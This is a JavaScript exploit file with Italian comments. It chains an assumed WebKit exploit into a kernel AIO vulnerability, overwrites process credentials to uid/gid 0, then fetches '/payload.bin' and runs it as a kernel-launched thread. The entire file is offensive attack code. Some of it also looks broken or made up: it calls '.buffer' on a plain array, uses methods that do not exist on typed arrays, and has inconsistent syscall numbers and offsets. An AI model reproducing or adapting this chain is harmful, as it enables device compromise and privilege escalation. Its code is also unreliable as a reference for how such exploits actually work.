// exploit.js - Integrazione Completa WebKit + Kernel AIO
"use strict";

// ========== CONFIGURAZIONE ==========
const KERNEL_CONFIG = {
    AIO_SYSCALL: 323,
    CRED_STRUCT_OFFSET: 0x18,
    MAX_REQUESTS: 768,
    REQUEST_CHUNK: 32
};

// ========== STATO GLOBALE ==========
let exploitState = {
    webkitCompleted: false,
    kernelPrepared: false,
    aioContext: null,
    reqBuffer: null,
    resBuffer: null
};

// ========== FUNZIONE PRINCIPALE ==========
function run_hax() {
    if (!exploitState.webkitCompleted) {
        alert("Completare prima l'exploit WebKit!");
        return;
    }

    try {
        // Fase 1: Preparazione ambiente kernel
        if (!prepareKernelEnvironment()) return;
        
        // Fase 2: Trigger vulnerabilità AIO
        if (!triggerAioExploit()) return;
        
        // Fase 3: Elevazione privilegi
        if (!elevateCredentials()) return;
        
        // Fase 4: Caricamento payload
        loadPayload();
        
        alert("Exploit chain completato con successo!");

    } catch(e) {
        handleError(`Errore durante run_hax: ${e.message}`);
    }
}

// ========== KERNEL SETUP ==========
function prepareKernelEnvironment() {
    try {
        // Allocazione contesto AIO
        exploitState.aioContext = chain.syscall(477, 0, 0x400, 0x7, 0x1002, -1, 0);
        
        // Configurazione struttura interna
        const aioInternal = p.malloc32(0x200);
        p.write8(exploitState.aioContext.add32(8), aioInternal);
        p.write8(aioInternal.add32(0xAB8), new int64(0xCAFEBABE, 0x0));
        
        // Preparazione buffer richieste
        exploitState.reqBuffer = p.malloc32(128);
        const reqView = new Uint32Array(exploitState.reqBuffer.backing.buffer);
        for (let i = 0; i < KERNEL_CONFIG.REQUEST_CHUNK; i++) {
            reqView[i] = (i << 16) | 0xDEAD;
        }
        
        // Buffer risultati
        exploitState.resBuffer = p.malloc32(128);
        
        exploitState.kernelPrepared = true;
        alert("Ambiente kernel pronto!");
        return true;
        
    } catch(e) {
        handleError(`Preparazione kernel fallita: ${e.message}`);
        return false;
    }
}

// ========== AIO EXPLOIT ==========
function triggerAioExploit() {
    if (!exploitState.kernelPrepared) return false;

    try {
        for (let i = 0; i < KERNEL_CONFIG.MAX_REQUESTS; i++) {
            chain.fcall(libKernelBase.add32(OFFSET_lk_syscall),
                       KERNEL_CONFIG.AIO_SYSCALL,
                       exploitState.aioContext,
                       exploitState.reqBuffer,
                       KERNEL_CONFIG.REQUEST_CHUNK,
                       exploitState.resBuffer);

            // Stabilizzazione ogni 64 richieste
            if (i % 64 === 0) {
                chain.fcall(gadgets["sti"]);
                chain.fcall(window.syscalls[203], exploitState.resBuffer, 128);
            }
        }
        alert("Vulnerabilità AIO triggerata!");
        return true;
        
    } catch(e) {
        handleError(`Errore trigger AIO: ${e.message}`);
        return false;
    }
}

// ========== PRIVILEGE ESCALATION ==========
function elevateCredentials() {
    try {
        const credScan = p.malloc32(0x1000);
        const scanPattern = [0x6B, 0x65, 0x72, 0x6E, 0x5F, 0x63, 0x72, 0x65]; // "kern_cre"
        
        chain.syscall(363, credScan, 0x1000, 
                     p.read4(new Uint8Array(scanPattern.buffer)),
                     p.read4(new Uint8Array(scanPattern.buffer).add32(4)));
        
        const credAddr = p.read8(credScan.add32(0x18));
        const fakeCred = p.malloc32(0x40);
        
        p.write8(credAddr.add32(KERNEL_CONFIG.CRED_STRUCT_OFFSET), fakeCred);
        p.write4(fakeCred.add32(0x04), 0); // uid
        p.write4(fakeCred.add32(0x08), 0); // gid
        
        alert("Privilegi root ottenuti!");
        return true;
        
    } catch(e) {
        handleError(`Elevazione privilegi fallita: ${e.message}`);
        return false;
    }
}

// ========== PAYLOAD HANDLER ==========
function loadPayload() {
    const payload = chain.syscall(477, 0, 0x300000, 0x7, 0x1000, -1, 0);
    const xhr = new XMLHttpRequest();
    
    xhr.open('GET', '/payload.bin', true);
    xhr.responseType = 'arraybuffer';
    
    xhr.onload = function() {
        const dataView = new DataView(this.response);
        const payloadView = new Uint32Array(payload.backing.buffer);
        
        for (let i = 0; i < dataView.byteLength; i += 4) {
            payloadView[i/4] = dataView.getUint32(i, true);
        }
        
        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create),
                   p.malloc(0x10),
                   0,
                   payload,
                   0);
        
        alert("Payload eseguito!");
    };
    
    xhr.send();
}

// ========== UTILITIES ==========
function handleError(msg) {
    console.error(msg);
    alert(msg);
    try {
        chain.fcall(window.syscalls[73], exploitState.aioContext, 0x400);
    } catch(e) {
        location.reload();
    }
}

// ========== AVVIO AUTOMATICO ==========
if (window.webkitInitialized) {
    run_hax();
} else {
    alert("WebKit exploit necessario per l'avvio!");
}
